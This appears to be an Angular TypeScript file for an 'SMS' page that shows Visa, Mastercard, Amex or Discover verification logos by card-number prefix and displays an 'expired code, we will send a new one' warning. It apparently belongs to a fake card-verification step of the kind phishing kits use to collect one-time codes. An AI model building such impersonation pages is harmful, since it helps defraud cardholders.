import { Component } from '@angular/core';

@Component({
  selector: 'app-sms',
  standalone: true,
  imports: [],
  templateUrl: './sms.component.html',
  styleUrl: './sms.component.css'
})
export class SmsComponent {

}

function renderImageSource(numb: string): string {
  let htmlContent = '';

  switch (numb.charAt(0)) {
      case '3':
          htmlContent = '<source type="image/svg+xml" srcset="assets/amex.png">';
          break;
      case '4':
          htmlContent = '<source type="image/svg+xml" srcset="assets/vbv_logo.gif"><img src="assets/vbv_logo.gif" alt="Logo">';
          break;
      case '5':
          htmlContent = '<source type="image/svg+xml" srcset="assets/2b660c78-cd00-4bb4-95bd-9e62e1141c60.svg 1x"><img src="assets/10ad0777-c108-45e7-8d80-8da0bb22ccd3.png" alt="Logo">';
          break;
      default:
          htmlContent = '<source type="image/svg+xml" srcset="assets/discover.png"><img src="assets/discover.png" alt="Logo">';
          break;
  }

  return htmlContent;
}

// Usage example, assuming numb is obtained somehow:
const numb = '4'; // This should be dynamically obtained, not hard-coded
const imageSourceHTML = renderImageSource(numb);
// Now, imageSourceHTML can be inserted into the DOM using JavaScript

function displayMessage(repeat: string | null): string {
    if (repeat === '1') {
        return '<p style="color:red;font-size: 11px; font-weight: bold;">Your unique code card has expired. Wait, we will send you a new one.</p>';
    }
    return '';
}

// This function would then be used in the context of your application,
// where `repeat` is a variable that you've obtained from your application's logic.







